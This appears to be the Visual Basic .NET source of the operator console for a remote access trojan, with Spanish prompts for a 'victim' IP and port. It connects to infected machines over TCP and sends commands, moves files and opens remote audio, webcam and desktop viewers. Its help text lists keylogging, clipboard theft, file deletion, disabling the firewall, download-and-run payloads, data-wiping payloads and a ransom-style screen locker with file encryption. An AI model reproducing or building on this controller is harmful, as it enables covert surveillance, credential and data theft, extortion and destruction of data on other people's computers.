Imports System.Net.Sockets
Imports System.Net
Imports System.Text
Public Class Main
    Public ServerIP As String
    Public ServerPort As String
    'Dim ctThread As Threading.Thread = New Threading.Thread(AddressOf LEER)
    Dim SendedCommandList As String = "/Join -XDTCPCMDReader"
    Dim TCP_UserNAME As String = Environment.UserName
    Dim UsersConnected As New ArrayList

    Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpszCommand As String, ByVal lpszReturnString As String, ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
    Dim CLIENTE As TcpClient
    Public NS As NetworkStream
    Dim COMPLEMENTO As String
    Dim Argumento As String

    Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Dim TXTVRIP = InputBox("Ingrese la IP de la Victima", "Conectar a Infectado", My.Settings.ServerIP)
        Dim TXTVRPORT = InputBox("Ingrese la Puerto de la Victima", "Conectar a Infectado", My.Settings.ServerPort)
        'Dim TXTVRChar = InputBox("Ingrese el caracter de corte", "Conectar a Infectado", My.Settings.CharSel)
        If TXTVRIP = Nothing Then
            MsgBox("Debe ingresar una Direccion IP", MsgBoxStyle.Critical, "Conexion")
            End
        Else
            ServerIP = TXTVRIP
            If TXTVRPORT = Nothing Then
                MsgBox("Debe ingresar un Puerto", MsgBoxStyle.Critical, "Conexion")
                End
            Else
                ServerPort = TXTVRPORT
                'If TXTVRChar = Nothing Then
                '    MsgBox("Debe ingresar un Caracter de corte", MsgBoxStyle.Critical, "Conexion")
                '    End
                'Else
                My.Settings.ServerIP = ServerIP
                My.Settings.ServerPort = ServerPort
                'My.Settings.CharSel = TXTVRChar
                My.Settings.Save()
                My.Settings.Reload()
                Connect()
                'End If
            End If
        End If
    End Sub

    Sub Connect()
        Try
            CLIENTE = New TcpClient
            CLIENTE.Connect(ServerIP, ServerPort)
            NS = CLIENTE.GetStream()
            Label2.Text = "Connected: " & ServerIP & ":" & ServerPort
            RichTextBox1.AppendText("Conectando..." & vbCrLf)
            ENVIAR("Conexion:" & TCP_UserNAME)
            RichTextBox1.AppendText("Conectado!" & vbCrLf)
            Button1.Enabled = True
            Timer1.Start()
        Catch ex As Exception
            MsgBox("Error al conectar al Servidor" & vbCrLf & ex.Message, MsgBoxStyle.Critical, "Worcome Security")
            Console.WriteLine("Error: " & ex.Message)
        End Try
    End Sub

    Sub CantConnect(ByVal MSG As String)
        If MSG = "Conectar" Then
        Else
            MsgBox("No se pudo conectar al Servidor", MsgBoxStyle.Critical, "Error al Enviar")
        End If
        Button1.Enabled = False
        CLIENTE.Close()
        Timer1.Stop()
    End Sub

    Public Sub ENVIAR(ByVal MENSAJE As String)
        Try
            Dim MIBUFFER() As Byte = Encoding.UTF8.GetBytes(MENSAJE)
            NS.Write(MIBUFFER, 0, MIBUFFER.Length)
        Catch ex As Exception
            CantConnect("Reconectar")
        End Try
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        LEER()
    End Sub

    Public Sub LEER()
        Try
            Dim MISBYTES() As Byte = New Byte(1024) {}
            Dim VACIO As Boolean = True
            If NS.DataAvailable Then
                NS.Read(MISBYTES, 0, MISBYTES.Length)
                For I = 0 To MISBYTES.Length - 1
                    If MISBYTES(I) <> 0 Then
                        VACIO = False
                        Exit For
                    End If
                Next
                If VACIO = False Then
                    Dim MENSAJE As String = Encoding.UTF8.GetString(MISBYTES)
                    Dim MISPLIT As String() = MENSAJE.Split(":")
                    If MENSAJE.Contains(TCP_UserNAME) Then
                        If CheckBox1.CheckState = CheckState.Checked Then
                            RichTextBox1.SelectionColor = Color.Yellow
                        ElseIf CheckBox1.CheckState = CheckState.Unchecked Then
                            RichTextBox1.SelectionColor = Color.DodgerBlue
                        End If
                    Else
                        If CheckBox1.CheckState = CheckState.Checked Then
                            RichTextBox1.SelectionColor = Color.LimeGreen
                        ElseIf CheckBox1.CheckState = CheckState.Unchecked Then
                            RichTextBox1.SelectionColor = Color.Black
                        End If
                    End If
                    If MENSAJE.StartsWith("Lista:") Then
                        UsersConnected.Clear()
                        Dim LISTA As String() = MENSAJE.Split("/")
                        For I = 0 To LISTA.Count - 1
                            If LISTA(I).ToString.Contains("Conexion:") Then
                                RichTextBox1.AppendText(vbCrLf & LISTA(I))
                                Dim MIITEM As String = LISTA(I).ToString
                                MIITEM = MIITEM.Remove(0, MIITEM.IndexOf(":") + 1)
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                RichTextBox1.ScrollToCaret()
                            ElseIf LISTA(I).ToString.Contains("Desconexion:") Then
                                RichTextBox1.AppendText(vbCrLf & LISTA(I))
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                            ElseIf LISTA(I).ToString.Contains("[Servidor]:Desconectado") Then
                                RichTextBox1.AppendText(vbCrLf & LISTA(I))
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                CantConnect("Conectar")
                            Else
                                Dim MIITEM As String = LISTA(I).ToString
                                MIITEM = MIITEM.Remove(0, MIITEM.IndexOf(":") + 1)
                                UsersConnected.Add(MIITEM)
                                My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                                RichTextBox1.ScrollToCaret()
                            End If
                        Next
                    Else
                        If MENSAJE.Contains(TCP_UserNAME) Then
                            My.Computer.Audio.PlaySystemSound(Media.SystemSounds.Exclamation)
                        End If
                        RichTextBox1.AppendText(vbCrLf & MENSAJE)
                        RichTextBox1.ScrollToCaret()
                    End If
                    Console.WriteLine("[RAW@Leer]" & MENSAJE.Trim())
                End If
            End If
        Catch ex As Exception
            CantConnect("Reconectar")
        End Try
    End Sub

    Private Sub TextBox1_KeyDown(sender As Object, e As KeyEventArgs) Handles TextBox1.KeyDown
        If CheckBox1.CheckState = CheckState.Checked Then
            If e.KeyCode = Keys.Enter Then
                CheckPreCommands()
            End If
        End If
        If e.KeyCode = Keys.Up Then
            TextBox1.Text = SendedCommandList
        ElseIf e.KeyCode = Keys.Down Then
            TextBox1.Clear()
        End If
    End Sub

    Private Sub Label1_DoubleClick(sender As Object, e As EventArgs) Handles Label1.DoubleClick
        RichTextBox1.Clear()
    End Sub

    Private Sub Label2_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles Label2.MouseDoubleClick
        Dim UserNameTXBVR = InputBox("Ingrese un Nombre de Usuario", "TCP Configuration", TCP_UserNAME)
        If UserNameTXBVR = Nothing Then
        Else
            TCP_UserNAME = UserNameTXBVR
        End If
    End Sub

    Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs) Handles CheckBox3.CheckedChanged
        If CheckBox3.CheckState = CheckState.Checked Then
            Me.TopMost = True
        Else
            Me.TopMost = False
        End If
    End Sub

    Private Sub SendMessage_Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        CheckPreCommands()
    End Sub

    Private Sub Label3_Click_1(sender As Object, e As EventArgs) Handles Label3.Click
        Dim IPInfo As String = Nothing
        IPInfo = vbCrLf
        Dim MI_HOST As String
        MI_HOST = Dns.GetHostName()
        Dim MIS_IP As IPAddress() = Dns.GetHostAddresses(MI_HOST)
        IPInfo = IPInfo & MI_HOST & vbCrLf
        For I = 0 To MIS_IP.Length - 1
            IPInfo = IPInfo & MIS_IP(I).ToString & vbCrLf
        Next
        RichTextBox1.AppendText(vbCrLf & "<---START MY LOCAL HOST INFO--->" & IPInfo & vbCrLf & ">---END MY LOCAL HOST INFO---<")
    End Sub

    Sub SendMessage()
        Try
            SendedCommandList = TextBox1.Text
            ENVIAR(TCP_UserNAME & ": " & TextBox1.Text)
            If CheckBox2.CheckState = CheckState.Checked Then
                RichTextBox1.ScrollToCaret()
            End If
            If TextBox1.Text.Contains("/Join -XDTCPCMDReader") Then
                SendedCommandList = "@Me.Help.Commands()"
            ElseIf TextBox1.Text.Contains("/Modules.FileSender.Send.File=") Then
                Dim tmpString As String = Nothing
                tmpString = TextBox1.Text
                tmpString = tmpString.Replace("/Modules.FileSender.Send.File=", "")
                FileSender.ENVIA(tmpString)
            ElseIf TextBox1.Text.Contains("/Modules.FileSender.Receive.File=") Then
                Dim tmpString As String = Nothing
                tmpString = TextBox1.Text
                tmpString = tmpString.Replace("/Modules.FileSender.Receive.File=", "")
                tmpString = tmpString.Remove(0, tmpString.LastIndexOf("\") + 1)
                FileSender.RECIBE(tmpString)
            ElseIf TextBox1.Text.Contains("/XD.Windows.TakeScreenShot()") Then
                Dim tmpString As String = "[" & Format(DateAndTime.TimeOfDay, "hh") & Format(DateAndTime.TimeOfDay, "mm") & Format(DateAndTime.TimeOfDay, "ss") & "]Screenshot.jpg"
                FileSender.RECIBE(tmpString)
            ElseIf TextBox1.Text = "/Modules.AudioTCP.Start()" Then
                TextBox1.Text = "@Me.Audio.Play()"
            ElseIf TextBox1.Text = "/Modules.RemoteTCP.Start()" Then
                TextBox1.Text = "@Me.Remote.Play()"
            ElseIf TextBox1.Text = "/Modules.VideoTCP.Start()" Then
                TextBox1.Text = "@Me.Video.Play()"
            ElseIf TextBox1.Text = "/Modules.Stop()" Then
                RemoteDesktop.Close()
                WebCamServer.Close()
                AudioClient.Close()
            End If
            TextBox1.Clear()
            TextBox1.Focus()
        Catch ex As Exception
            Console.WriteLine("[Chat@SendMessage]Error: " & ex.Message)
        End Try
    End Sub

    Sub CheckPreCommands()
        If TextBox1.Text = "@Me.Reconnect/Research" Then
            Try
                Try
                    ENVIAR("Desconexion:" & TCP_UserNAME)
                    'chThread.Abort()
                    Timer1.Stop()
                Catch ex As Exception
                End Try
                Connect()
            Catch ex As Exception
                Console.WriteLine("[Main@CMD_AutoDETECT(SendMessage_Button1_Click)]Error: " & ex.Message)
            End Try
            TextBox1.Clear()
        ElseIf TextBox1.Text = "@Me.Audio.Play()" Then
            Try
                AudioClient.Show()
            Catch ex As Exception
                Console.WriteLine("[Main@CMD_AutoDETECT(SendMessage_Button1_Click)]Error: " & ex.Message)
            End Try
            TextBox1.Clear()
        ElseIf TextBox1.Text = "@Me.Remote.Play()" Then
            Try
                RemoteDesktop.Show()
            Catch ex As Exception
                Console.WriteLine("[Main@CMD_AutoDETECT(SendMessage_Button1_Click)]Error: " & ex.Message)
            End Try
            TextBox1.Clear()
        ElseIf TextBox1.Text = "@Me.Video.Play()" Then
            Try
                WebCamServer.Show()
            Catch ex As Exception
                Console.WriteLine("[Main@CMD_AutoDETECT(SendMessage_Button1_Click)]Error: " & ex.Message)
            End Try
            TextBox1.Clear()
        ElseIf TextBox1.Text = "@Me.Log.Clear()" Then
            RichTextBox1.Clear()
            TextBox1.Clear()
        ElseIf TextBox1.Text = "@Me.Close()" Then
            Me.Close()
        ElseIf TextBox1.Text = "@Me.Help.Commands()" Then
            RichTextBox1.AppendText(vbCrLf & "COMANDOS REMOTOS PARA EQUISDE VRS" &
                                    vbCrLf & "Iniciar sesion: /Join -XDTCPCMDReader" &
                                    vbCrLf &
                                    vbCrLf & "Windows Commands" &
                                    vbCrLf & "Iniciar programa: /Windows.Start.App={ProgramName.exe_AS_STRING}" &
                                    vbCrLf & "Obtener programas: /Windows.Tasks.GetApps()" &
                                    vbCrLf & "Mostrar mensaje: /Windows.Message.Show={Mensaje_AS_STRING}" &
                                    vbCrLf & "Obtener el Portapapeles: /Windows.Clipboard.Get()" &
                                    vbCrLf & "Setear texto al Portapapeles: /Windows.Clipboard.Set={Text_AS_STRING}" &
                                    vbCrLf & "Obtener todos las Carpetas: /Windows.FileSystem.GetDirectory(All)" &
                                    vbCrLf & "Obtener todos los Archivos: /Windows.FileSystem.GetFiles(All)" &
                                    vbCrLf & "Ver el contenido de un directorio: /Windows.FileSystem.DirView={Directorio_AS_STRING}" &
                                    vbCrLf & "Crear un directorio remoto: /Windows.FileSystem.DirCreate={Ruta>Nombre_AS_STRING}" &
                                    vbCrLf & "Leer Archivo remoto: /Windows.FileSystem.Read={RutaArchivo_AS_STRING}" &
                                    vbCrLf & "Escribir Archivo remoto: /Windows.FileSystem.Write={RutaArchivo>Contenido_AS_STRING}" &
                                    vbCrLf & "Eliminar Archivo/Carpeta remot@: /Windows.FileSystem.Delete={Directorio/RutaArchivo_AS_STRING}" &
                                    vbCrLf & "Obtener informacion del host: /Windows.System.GetHost()" &
                                    vbCrLf & "Cerrar programa: /Windows.Close.App={ProgramName_AS_STRING}" &
                                    vbCrLf & "Apagar forzado: /Windows.Shutdown(FORCE)" &
                                    vbCrLf & "Apagar pasivo: /Windows.Shutdown(PASSIVE)" &
                                    vbCrLf &
                                    vbCrLf & "XD Commands" &
                                    vbCrLf & "Obtener archivos en el directorio raiz: /XD.DirCommons.GetFiles()" &
                                    vbCrLf & "Obtener un reporte de Equisde: /XD.Report.GetInfo()" &
                                    vbCrLf & "Tomar un pantallazo: /XD.Windows.TakeScreenShot()" &
                                    vbCrLf & "Crear un reporte web: /XD.Report.CreateWeb()" &
                                    vbCrLf & "Detener el reporte web: /XD.Report.StopWeb()" &
                                    vbCrLf & "Permitir/No Permitir un diagnostico a traves del canal TCP: /XD.Report.Diagnostic(TRUE:FALSE_AS_BOOLEAN)" &
                                    vbCrLf & "Modules Commands" &
                                    vbCrLf & "Activar todas las Cargas: /Payloads.ActivateAllPayloads()" &
                                    vbCrLf & "Activar Carga de Borrado: /Payloads.BorrarCosillas()" &
                                    vbCrLf & "Activar Carga de Conexion: /Payloads.DesconectarConexion()" &
                                    vbCrLf & "Bloquear teclado/mouse remoto: /Payloads.BlockInput(FALSE/TRUE_AS_BOOLEAN)" &
                                    vbCrLf & "Desactivar/Activar el Firewall de Windows: /Payloads.WindowsFirewall(TRUE:FALSE_AS_BOOLEAN)" &
                                    vbCrLf & "Activar Carga de Descarga /Payloads.DownloadSomething={URL>Nombre.formato>RUN(True:False_AS_BOOLEAN)>Argumentos_AS_STRING}" &
                                    vbCrLf & "Iniciar modulo de Audio: /Modules.AudioTCP.Start()" &
                                    vbCrLf & "Iniciar modulo de Video: /Modules.VideoTCP.Start()" &
                                    vbCrLf & "Iniciar modulo de Video: /Modules.RemoteTCP.Start()" &
                                    vbCrLf & "Iniciar modulo de Keylogger: /Modules.Keylogger.Start()" &
                                    vbCrLf & "Mostrar datos del Keylogger: /Modules.Keylogger.GetData()" &
                                    vbCrLf & "Limpiar datos del Keylogger: /Modules.Keylogger.ClearData()" &
                                    vbCrLf & "Iniciar modulo ScreenLocker: /Modules.ScreenLocker.Start()" &
                                    vbCrLf & "Bloquear acceso a Carpeta: /Modules.Cipher.LockDir={Directorio_AS_STRING}" &
                                    vbCrLf & "Desbloquear acceso a Carpeta: /Modules.Cipher.UnlockDir={Directorio_AS_STRING}" &
                                    vbCrLf & "Encriptar un fichero: /Modules.Cipher.FileEncrypt={RutaArchivo_AS_STRING}" &
                                    vbCrLf & "Desencriptar un fichero: /Modules.Cipher.FileDecrypt={RutaArchivo_AS_STRING}" &
                                    vbCrLf & "Definir SerialKey a ScreenLocker: /Modules.ScreenLocker.Config.SerialKey={CodigoSerial_AS_STRING}" &
                                    vbCrLf & "Definir ayuda para ScreenLocker: /Modules.ScreenLocker.Config.SolveSerialKey={AyudaParaElUsuario_AS_STRING}" &
                                    vbCrLf & "Definir tiempo maximo: /Modules.ScreenLocker.Config.MaxTime={MinutosEnMilisegundos_AS_STRING}" &
                                    vbCrLf & "Definir accion al alcanzar tiempo maximo: /Modules.ScreenLocker.Config.ActionAtTime=<BSODForce|UnLock_AS_STRING>" &
                                    vbCrLf & "Enviar archivo remoto: /Modules.FileSender.Send.File={RutaArchivoLocal_AS_STRING}" &
                                    vbCrLf & "Recibir archivo remoto: /Modules.FileSender.Receive.File={RutaArchivoRemoto_AS_STRING}" &
                                    vbCrLf & "Escribir texto remoto: /Modules.GGKeys.GetText={Texto>Programa_AS_STRING}" &
                                    vbCrLf & "Setear IP a todos los Modulos: /Modules.TCP.SetIP={IP_AS_STRING}" &
                                    vbCrLf & "Cerrar todos los Modulos: /Modules.Stop()" &
                                    vbCrLf & "Resetear modulos remotos: /Modules.Remove()" &
                                    vbCrLf &
                                    vbCrLf & "Others" &
                                    vbCrLf & "Recargar Base de Datos: /DataBase.Reload()" &
                                    vbCrLf & "Resetear la base de datos: /DataBase.Reset()" &
                                    vbCrLf & "Vacunar ordenador remoto: /Vaccine()" &
                                    vbCrLf & "Eliminar todo: /Unistall={Delay_AS_INTEGER}" &
                                    vbCrLf & "Detener todo: /Stop()" &
                                    vbCrLf & vbCrLf &
                                    "COMANDOS LOCALES" &
                                    vbCrLf & "Reconectar: @Me.Reconnect/Research" &
                                    vbCrLf & "Comandos: @Me.Help.Commands()" &
                                    vbCrLf & "Limpiar log: @Me.Log.Clear()" &
                                    vbCrLf & "Reproducir Audio Remoto: @Me.Audio.Play()" &
                                    vbCrLf & "Reproducir Video Remoto: @Me.Video.Play()" &
                                    vbCrLf & "Reproducir Escritorio Remoto: @Me.Remote.Play()" &
                                     vbCrLf & "Cerrar Panel de Control: @Me.Close()")
            TextBox1.Clear()
        Else
            SendMessage()
        End If
    End Sub
End Class